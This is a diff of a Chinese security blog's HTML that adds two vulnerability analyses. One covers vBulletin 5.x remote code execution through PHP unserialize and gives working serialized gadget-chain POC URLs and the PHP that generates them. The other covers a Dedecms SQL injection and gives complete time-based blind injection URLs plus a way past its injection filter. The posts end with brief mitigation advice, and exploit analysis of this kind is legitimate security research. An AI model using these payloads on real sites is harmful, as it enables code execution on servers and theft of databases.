+</code></pre><h4 id="2，反序列化后对上下文变量覆盖的利用"><a href="#2，反序列化后对上下文变量覆盖的利用" class="headerlink" title="2，反序列化后对上下文变量覆盖的利用"></a>2，反序列化后对上下文变量覆盖的利用</h4><h4 id="POC角度分析"><a href="#POC角度分析" class="headerlink" title="POC角度分析"></a>POC角度分析</h4><pre><code>http://192.168.103.129/vBulletin/upload/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A21%3A%22print%28%27Hello+world%21%27%29%22%3B%7D
+</code></pre><p>对URL进行分解，path为vBulletin对参数进行路由转换的结果，本质也是mvc调用，vBulletin处理的格式为<strong>ajax/api/[controller]/[method]</strong>，也就是说此访问页面调用的是<strong>hook文件的decodeArgument方法</strong>。query内只有一个参数，参数的名称为arguments，参数的值为一段序列化的代码。</p>
+<p>看下输出序列化值的代码</p>
+<pre><code>&lt;?php
+class vB_Database_MySQL {
+   public $functions = array();
+   public function __construct() {
+           $this-&gt;functions[&apos;free_result&apos;] = &apos;assert&apos;;
+   }
+}
+
+class vB_dB_Result {
+   protected $db;
+   protected $recordset;
+   public function __construct() {
+           $this-&gt;db = new vB_Database_MySQL();
+           $this-&gt;recordset = &apos;print(\&apos;Hello world!\&apos;)&apos;;
+   }
+}
+
+
+print urlencode(serialize(new vB_dB_Result())) . &quot;\n&quot;;
+
+?&gt;
+</code></pre><p>最终输出的是 <code>serialize(new vB_dB_Result())</code>的值，类vB_dB_Result定义了两个protected变量，并且其构造函数对这两个protected变量进行复制，$recordset赋值为一段字符串，从poc也可看出来，$recordset的值就是要执行的代码片段。$db的赋值为vB_Database_MySQL，定义了一个数组类型的变量$functions，并给这个数组的free_result索引赋值为assert。因此可以对此进行下小结，vBulletin通过对传值进行反序列化操作，可以对其执行上下文中的变量进行覆盖。覆盖后，会产生代码执行漏洞。</p>
+<h4 id="代码角度分析"><a href="#代码角度分析" class="headerlink" title="代码角度分析"></a>代码角度分析</h4><p>首先进入hook.php文件的vB_Api_Hook类的decodeArguments方法，传入的值会被进行反序列化操作。变量$args会被赋值为vB_Database_Result类。</p>
+<pre><code>public function decodeArguments($arguments)
+{
+ =》if ($args = @unserialize($arguments))
+    {
+        $result = &apos;&apos;;
+
+        foreach ($args AS $varname =&gt; $value)
+        {
+            $result .= $varname;
+            ...
+</code></pre><p>接着进入foreach函数，由于$args为<strong>对象</strong>数据结构，并且当前类（vB_Database_Result类）implements于Iterator接口，因此当php在遍历对象$args时，便首先会调用其rewind()方法。<a href="http://php.net/manual/zh/control-structures.foreach.php" target="_blank" rel="external">foreach遍历对象</a>，<a href="http://php.net/manual/zh/language.oop5.iterations.php" target="_blank" rel="external">迭代器遍历</a>。以上两个链接详细讲解了php遍历对象操作的细节。</p>
+<pre><code>public function decodeArguments($arguments)
+{
+    if ($args = @unserialize($arguments))
+    {
+        $result = &apos;&apos;;
+
+     =》foreach ($args AS $varname =&gt; $value)
+        {
+            $result .= $varname;
+            ...
+</code></pre><p>然后跟入result.php的vB_Database_Result类的rewind()方法，此方法会调用当前类内的<strong>类变量$db的free_result方法</strong>，并且为其传入类变量$recordset的值。</p>
+<pre><code>public function rewind()
+{
+    if ($this-&gt;bof)
+    {
+        return;
+    }
+
+    if ($this-&gt;recordset)
+    {
+     =》$this-&gt;db-&gt;free_result($this-&gt;recordset);
+    }
+    ...
+</code></pre><p>最后跟入database.php的vB_Database类的free_result方法，由于控制了当前类（vB_Database类）的变量$functions[‘free_result’]，和传入的$queryresult，因此此处达成了动态函数执行，漏洞利用至此结束。</p>
+<pre><code>function free_result($queryresult)
+{
+    $this-&gt;sql = &apos;&apos;;
+ =》return @$this-&gt;functions[&apos;free_result&apos;]($queryresult);
+}
+</code></pre><p><img src="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/1.png"></p>
+<h4 id="3，反序列化后利用魔术方法RCE的利用"><a href="#3，反序列化后利用魔术方法RCE的利用" class="headerlink" title="3，反序列化后利用魔术方法RCE的利用"></a>3，反序列化后利用魔术方法RCE的利用</h4><h4 id="POC角度分析-1"><a href="#POC角度分析-1" class="headerlink" title="POC角度分析"></a>POC角度分析</h4><pre><code>http://192.168.103.129/vBulletin/upload/ajax/api/hook/decodeArguments?arguments=O%3A7%3A%22vB_vURL%22%3A1%3A%7Bs%3A7%3A%22tmpfile%22%3BO%3A16%3A%22vB_View_AJAXHTML%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00content%22%3BO%3A12%3A%22vB5_Template%22%3A2%3A%7Bs%3A11%3A%22%00%2A%00template%22%3Bs%3A10%3A%22widget_php%22%3Bs%3A13%3A%22%00%2A%00registered%22%3Ba%3A1%3A%7Bs%3A12%3A%22widgetConfig%22%3Ba%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A16%3A%22phpinfo%28%29%3Bdie%28%29%3B%22%3B%7D%7D%7D%7D%7D
+</code></pre><p>POC如上，同理上文的路径分析。</p>
+<p>看下输出序列化值的代码</p>
+<pre><code>&lt;?php
+class vB5_Template {
+    public $tmpfile;
+    protected $template;
+    protected $registered = array();
+    public function __construct() {
+        $this-&gt;template = &apos;widget_php&apos;;
+        $this-&gt;registered[&apos;widgetConfig&apos;] = array(&apos;code&apos; =&gt; &apos;print_r(\&apos;hello manning\&apos;);die();&apos;);
+   }
+}
+
+class vB_View_AJAXHTML {
+    public $tmpfile;
+    protected $content;
+    public function __construct() {
+        $this-&gt;content = new vB5_Template();
+   }
+}
+
+class vB_vURL {
+    public $tmpfile;
+    public function __construct() {
+        $this-&gt;tmpfile = new vB_View_AJAXHTML();
+    }
+}
+
+print urlencode(serialize(new vB_vURL())) . &quot;\n&quot;;
+?&gt;    
+</code></pre><p>最终输出的是 <code>serialize(new vB_vURL())</code>的值，向类vB_vURL注入了一个public变量$temfile，并且赋值为类vB_View_AJAXHTML，而类vB_View_AJAXHTML的构造函数中，向其类内对象$content赋值类vB5_Template，最终的利用代码在类vB5_Template中$template和$registered中，含义分别是调用模板widget_php和$registered[‘widgetConfig’]的值为利用代码。</p>
+<h4 id="代码角度分析-1"><a href="#代码角度分析-1" class="headerlink" title="代码角度分析"></a>代码角度分析</h4><p>首先进入hook.php文件的vB_Api_Hook类的decodeArguments方法，传入的值会被进行反序列化操作。变量$args会被赋值为vB_vURL类。</p>
+<pre><code>public function decodeArguments($arguments)
+{
+ =&gt; if ($args = @unserialize($arguments))
+    {
+        $result = &apos;&apos;;
+
+     =》foreach ($args AS $varname =&gt; $value)
+        {
+            $result .= $varname;
+
+            if(is_array($value))
+            {
+                $this-&gt;decodeLevel($result, $value, &apos;=&apos;);
+            }
+
+            $result .= &quot;\n&quot;;
+        }
+
+        return $result;
+    }
+
+    return &apos;&apos;;
+}
+</code></pre><p>在foreach中，由于$args为<strong>对象</strong>数据结构，并且当前类（vB_vURL类）并没有implements于Iterator接口，因此当php在遍历对象$args时，只是会遍历vB_vURL类的public变量，不会产生漏洞。</p>
+<p>由于要进行return操作，因此便出发了当前类（vB_vURL类）的析构函数。</p>
+<pre><code>function __destruct()
+{
+ =&gt; if (file_exists($this-&gt;tmpfile))
+    {
+        @unlink($this-&gt;tmpfile);
+    }
+}
+</code></pre><p>由于为其$tmpfile赋值为一个对象，file<em>exists方法会试图把类转化为字符串，因此触发了$tmpfile对象的\</em>_toString()方法。（<strong>由于传入的是vB_View_AJAXHTML类，vB_View_AJAXHTML类继承于vB_View类，因此触发的是vB_View类的__toString方法</strong>）</p>
+<pre><code>public function __toString()
+{
+    try
+    {
+       =&gt; return $this-&gt;render();
+    }
+    catch(vB_Exception $e)
+    {
+        //If debug, return the error, else
+        return &apos;&apos;;
+    }
+}
+</code></pre><p>由上文可知，当前$this对象其实还是vB_View_AJAXHTML类的对象，因此进入了vB_View_AJAXHTML类的render()方法，由于定义了vB_View_AJAXHTML类的$content类对象。</p>
+<pre><code>public function render($send_content_headers = false)
+{
+    ...
+
+    if ($this-&gt;content)
+    {
+      =》 $xml-&gt;add_tag(&apos;html&apos;, $this-&gt;content-&gt;render());
+    }
+</code></pre><p>类对象$content已经被赋值为vB5_Template类对象，因此会进入vB5_Template类的render()方法。</p>
+<pre><code>public function render($isParentTemplate = true, $isAjaxTemplateRender = false)
+{
+    $this-&gt;register(&apos;user&apos;, $user, true);
+    extract(self::$globalRegistered, EXTR_SKIP | EXTR_REFS);
+ =》extract($this-&gt;registered, EXTR_OVERWRITE | EXTR_REFS);
+
+    ...
+
+    $templateCache = vB5_Template_Cache::instance();
+ =》$templateCode = $templateCache-&gt;getTemplate($this-&gt;template);
+    if($templateCache-&gt;isTemplateText())
+    {
+       =》@eval($templateCode);
+    }
+</code></pre><p>vB5_Template类的render()方法，此方法会执行extract()方法和eval()方法，并且都可以控制传入的参数，因此会导致代码执行。再看一次poc。</p>
+<pre><code>&lt;?php
+class vB5_Template {
+    public $tmpfile;
+    protected $template;
+    protected $registered = array();
+    public function __construct() {
+        $this-&gt;template = &apos;widget_php&apos;;
+        $this-&gt;registered[&apos;widgetConfig&apos;] = array(&apos;code&apos; =&gt; &apos;print_r(\&apos;hello manning\&apos;);die();&apos;);
+   }
+}
+</code></pre><p>也就是说，目前我们控制两个关键点。</p>
+<ul>
+<li>要执行的模板</li>
+<li>模板需要的参数</li>
+</ul>
+<p>此时代码已经覆盖了$registered变量的widgetConfig索引，因此会把数组$widgetConfig注册到全局变量内，其var_dump为</p>
+<pre><code>array (size=1)
+    &apos;code&apos; =&gt; string &apos;print_r(&apos;hello manning&apos;);die();&apos; (length=31)
+</code></pre><p>然后模板widget_php存在</p>
+<pre><code>$evaledPHP = vB5_Template_Runtime::parseAction(&apos;bbcode&apos;, &apos;evalCode&apos;, $widgetConfig[&apos;code&apos;]); 
+</code></pre><p>因此，导致代码执行。</p>
+<p><img src="/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/2.png"></p>
+<p>0x02 漏洞总结<br>-</p>
+<p>vBulletin 5系列通杀的代码执行漏洞，无难度getshell。这个漏洞可以说是php反序列化操作的最佳反面教程，讲述了使用反序列化不当，造成的严重后果。既可覆盖代码的上下文进行RCE，又可利用传统的方式在魔术方法中进行RCE。</p>
+<p>漏洞小结</p>
+<p>影响范围个人评价为“高”，危害性个人评价为“高”，vBulletin在全球的使用范围非常广，此漏洞在vBulletin 5版本通杀。</p>
+<p>防护方案</p>
+<p>使用反序列化的地方增多了数据的种类，增大了风险。因此防护方案如下：</p>
+<ul>
+<li>使用反序列化结果的地方，检测是否存在危险操作</li>
+<li>尽量避免使用反序列化交互操作</li>
+</ul>
+<p>0x03 引用资料<br>-</p>
+<ul>
+<li><a href="http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq" target="_blank" rel="external">http://pastie.org/pastes/10527766/text?key=wq1hgkcj4afb9ipqzllsq</a></li>
+<li><a href="http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/" target="_blank" rel="external">http://blog.checkpoint.com/2015/11/05/check-point-discovers-critical-vbulletin-0-day/</a></li>
+<li><a href="http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/" target="_blank" rel="external">http://blog.knownsec.com/2015/11/unserialize-exploit-with-vbulletin-5-x-x-remote-code-execution/</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/11/10/vBulletin-5-0-x-5-1-x-RCE/" data-id="cj343myf000060ofyudx4n0qf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Dedecms-20150618-注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2015/08/14/Dedecms-20150618-注入/" class="article-date">
+  <time datetime="2015-08-14T07:24:57.000Z" itemprop="datePublished">2015-08-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/08/14/Dedecms-20150618-注入/">Dedecms 20150618 注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="0x00-漏洞信息"><a href="#0x00-漏洞信息" class="headerlink" title="0x00 漏洞信息"></a>0x00 漏洞信息</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2015-0127787" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2015-0127787</a></p>
+<h2 id="0x01-漏洞成因概述"><a href="#0x01-漏洞成因概述" class="headerlink" title="0x01 漏洞成因概述"></a>0x01 漏洞成因概述</h2><p>由于dedecms使用伪全局变量原因，可导致用户构造任意的sql语句，造成注入。</p>
+<p>漏洞利用流程：</p>
+<ul>
+<li>利用_FILE传递数组</li>
+<li>绕过dedecms的sql注入检测机制</li>
+<li>进行注入</li>
+</ul>
+<h2 id="0x02-漏洞细节"><a href="#0x02-漏洞细节" class="headerlink" title="0x02 漏洞细节"></a>0x02 漏洞细节</h2><h3 id="完整进行注入的语句为："><a href="#完整进行注入的语句为：" class="headerlink" title="完整进行注入的语句为："></a>完整进行注入的语句为：</h3><pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?
+dopost=save&amp;
+_FILES[mtypename][name]=.xxxx&amp;
+_FILES[mtypename][type]=xxxxx&amp;
+_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT DISTINCT(schema_name) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1 ),1,1)) like 54,5,0)),0)%23fuck]=1&amp;
+_FILES[mtypename][size]=.xxxx
+</code></pre><p>需要理解的四点：</p>
+<ol>
+<li>为什么用_FILE传数组</li>
+<li>为什么注入语句写在tmp_name后</li>
+<li>为什么注入语句中有`‘`.``.mtypeid</li>
+<li>如何绕过dede的防注入</li>
+</ol>
+<h3 id="变量传递过程"><a href="#变量传递过程" class="headerlink" title="变量传递过程"></a>变量传递过程</h3><p>mtypes.php文件是一个缺陷文件，只要通过把$mtypename构造成数组，并且在把数组的key定义为sql注入语句，那么便可逃逸全局GPC。</p>
+<pre><code>foreach ($mtypename as $id =&gt; $name)
+{
+    $name = HtmlReplace($name);
+    $query = &quot;UPDATE `#@__mtypes` SET mtypename=&apos;$name&apos; WHERE mtypeid=&apos;$id&apos; AND mid=&apos;$cfg_ml-&gt;M_ID&apos;&quot;;
+    $dsql-&gt;ExecuteNoneQuery($query);
+}
+</code></pre><p>该文件的最后部分为缺陷部分，$id 和 $name 都在查询语句中，但是全局过滤未对数组的key进行过滤，导致$id内可以带任何字符，接下来就是构造$id的事情了。</p>
+<p>由于dedecms是一个伪全局的cms，我们需要把$mtypename覆盖出来，那么为什么用_FILE传输组呢，整个cms在变量初始化的过程中，在uploadsafe.inc.php中，会预处理_FILE传入的值，但是这段代码有问题。</p>
+<pre><code>foreach($_FILES as $_key=&gt;$_value)
+{
+    foreach($keyarr as $k)
+    {
+        if(!isset($_FILES[$_key][$k]))
+        {
+            exit(&apos;Request Error!&apos;);
+        }
+    }
+if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )
+{
+    exit(&apos;Request var not allow for uploadsafe!&apos;);
+}
+$$_key = $_FILES[$_key][&apos;tmp_name&apos;];
+${$_key.&apos;_name&apos;} = $_FILES[$_key][&apos;name&apos;];
+${$_key.&apos;_type&apos;} = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);
+${$_key.&apos;_size&apos;} = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);
+</code></pre><p>可以在倒数第四行看到一处变量覆盖，取$_key作为key，$_FILES[$_key][‘tmp_name’]作为value。</p>
+<p>我们传入的内容</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/3.png" alt=""></p>
+<p>覆盖后的内容</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/4.png" alt=""></p>
+<p><strong>绕过dedecms防sql模块</strong></p>
+<p>dedecms防注入模块有个bug，只要在`‘`后面的语句，都不会过防sqli模块。</p>
+<p>为什么这么构造？首先，我们看下dedecms防注入模块的执行流程。</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/5.png" alt=""></p>
+<p>在流程图中，最关键的步骤是生产clean sql的部分，其代码如下。</p>
+<pre><code>while (TRUE)
+    {
+        $pos = strpos($db_string, &apos;\&apos;&apos;, $pos + 1);
+        if ($pos === FALSE)
+        {
+            break;
+        }
+        $clean .= substr($db_string, $old_pos, $pos - $old_pos);
+        while (TRUE)
+        {
+            $pos1 = strpos($db_string, &apos;\&apos;&apos;, $pos + 1);
+            $pos2 = strpos($db_string, &apos;\\&apos;, $pos + 1);
+            if ($pos1 === FALSE)
+            {
+                break;
+            }
+            elseif ($pos2 == FALSE || $pos2 &gt; $pos1)
+            {
+                $pos = $pos1;
+                break;
+            }
+            $pos = $pos2 + 1;
+        }
+        $clean .= &apos;$s$&apos;;
+        $old_pos = $pos + 1;
+    }
+    $clean .= substr($db_string, $old_pos);
+    $clean = trim(strtolower(preg_replace(array(&apos;~\s+~s&apos; ), array(&apos; &apos;), $clean)));
+</code></pre><p>通过阅读以上代码可以发现，这段代码的主要逻辑是把两个单引号（’）中间的内容替换为$s$，其他语句拼接到clean sql中。pos为第一个单引号的位置，pos1为第二的单引号的位置，pos2为第一个消意号的位置，通过这三个位置，便可以确定单引号之间的内容。</p>
+<p>通过这个特性，绕过防注入模块的思路大致是这样：<strong>先构造一个无意义的单引号，再在注释后面构造一个单引号来闭合前面无意义的单引号。</strong></p>
+<p>翻看之前dedecms的注入发现，大致有如下几种绕过技巧。</p>
+<ul>
+<li>char(@`‘`)</li>
+<li>char(“‘“)</li>
+<li>@`‘`</li>
+</ul>
+<p>但是最新版本已经对如上方式进行了检测</p>
+<pre><code>if (strpos($clean, &apos;@&apos;) !== FALSE  OR strpos($clean,&apos;char(&apos;)!== FALSE OR strpos($clean,&apos;&quot;&apos;)!== FALSE OR strpos($clean,&apos;$s$$s$&apos;)!== FALSE)
+</code></pre><p>因此需要一种新型绕过方式，主要还是利用`‘`特性：</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/2.png" alt=""></p>
+<p>但是有个要求，hitsid必须是testf.v959_hits表的字段，同理，利用此特性，构造查询语句。</p>
+<p>构造盲注查询语句：</p>
+<pre><code>1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))like 50,5,0)),0)%23fuck
+</code></pre><p>此语句所查内容为：如果此mysql所含的数据库的个数的第一位为2（ascii码为50），则sleep 5秒。</p>
+<h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>只要登陆了用户中心，便可以进行时间盲注，查询数据库内容。</p>
+<p><img src="/2015/08/14/Dedecms-20150618-注入/6.png" alt=""></p>
+<p>查mysql所含的数据库的个数</p>
+<p>个数的第一位为2</p>
+<pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),1,1))like 50,5,0)),0)%23fuck]=1&amp;_FILES[mtypename][size]=.xxxx
+</code></pre><p>个数的第二位为3</p>
+<pre><code>http://192.168.110.135//dedefull/uploads/member/mtypes.php?dopost=save&amp;_FILES[mtypename][name]=.xxxx&amp;_FILES[mtypename][type]=xxxxx&amp;_FILES[mtypename][tmp_name][1&apos; and `&apos;`.``.mtypeid or if(now() like sysdate(),SLEEP(if(ORD(MID(( SELECT count(DISTINCT(schema_name)) FROM INFORMATION_SCHEMA.SCHEMATA),2,1))like 51,5,0)),0)%23fuck]=1&amp;_FILES[mtypename][size]=.xxxx
+</code></pre><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>该漏洞利用零散的dedecms的漏洞，对这些小问题加以组合，最终到达随意注射的程度，十分精彩。分析这个漏洞，收获是在漏洞分析时，要有全局的眼光，不要忽视之前出现的每一个问题。</p>
+<p>漏洞小结</p>
+<p>影响范围个人评价为“高”，危害性个人评价为“高”，dedecms在国内的使用范围非常广，此漏洞只要登录会员中心便可取数据。</p>
+<p>防护方案</p>
+<p>对数组传入的key和value均进行gpc过滤。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2015/08/14/Dedecms-20150618-注入/" data-id="cj343mye400000ofyi0nsb7nl" class="article-share-link">Share</a>
       
       
     </footer>
@@ -517,7 +1120,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">December 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li></ul>
     </div>
   </div>
 
@@ -539,6 +1142,14 @@
         
           <li>
             <a href="/2017/03/08/Struts2-Jakarta模块Content-type命令执行漏洞-CVE-2017-5638/">Struts2 Jakarta模块Content-type命令执行漏洞(CVE-2017-5638)</a>
+          </li>
+        
+          <li>
+            <a href="/2016/05/05/ImageMagic初步分析/">ImageMagic初步分析</a>
+          </li>
+        
+          <li>
+            <a href="/2015/12/22/Java反序列化内容/">Java反序列化内容</a>
           </li>
         
       </ul>
